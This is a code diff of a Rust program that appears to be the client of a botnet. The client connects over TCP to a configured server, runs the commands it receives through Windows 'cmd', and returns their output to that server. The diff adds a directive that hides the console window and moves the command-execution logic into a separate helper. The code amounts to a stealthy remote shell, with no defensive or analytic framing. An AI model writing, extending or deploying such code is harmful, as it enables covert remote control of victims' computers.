@@ -1,4 +1,6 @@
-use bnet_core::{models, protocol, utils, config};
+#![windows_subsystem = "windows"]
+
+use bnet_core::{config, protocol, utils};
 use std::net::TcpStream;
 
 mod terminal;
@@ -15,7 +17,7 @@ fn main() {
         .unwrap();
     match TcpStream::connect(config::IP) {
         Ok(stream) => {
-            println!("Successfully connected to server in port 7878");
+            println!("Successfully connected");
 
             let established_connection = utils::send_request_check(
                 &stream,
@@ -34,36 +36,8 @@ fn main() {
                             .map(|x| x.replace('\"', ""))
                             .collect::<Vec<String>>();
                         println!("{:?}", args_formated);
-                        match std::process::Command::new("cmd")
-                            .args(args_formated)
-                            .output()
-                        {
-                            Ok(result) => {
-                                let result_string =
-                                    String::from_utf8_lossy(&result.stdout).trim().to_string();
-                                let result_err =
-                                    String::from_utf8_lossy(&result.stderr).trim().to_string();
-                                let ACTION_RESULT: models::Request = models::Request {
-                                    syl: 'A',
-                                    num: '5',
-                                    msg: if result.status.success() {
-                                        result_string
-                                    } else {
-                                        result_string + " " + &result_err
-                                    },
-                                };
-                                utils::send_request(&stream, &ACTION_RESULT);
-                            }
-                            Err(e) => {
-                                let ACTION_RESULT: models::Request = models::Request {
-                                    syl: 'A',
-                                    num: '5',
-                                    msg: e.to_string(),
-                                };
-                                utils::send_request(&stream, &ACTION_RESULT);
-                                println!("Failed to execute: {}", e);
-                            }
-                        };
+                        let ACTION_REQUEST = terminal::execute_command(args_formated);
+                        &utils::send_request(&stream, &ACTION_REQUEST);
                     }
                 }
             }
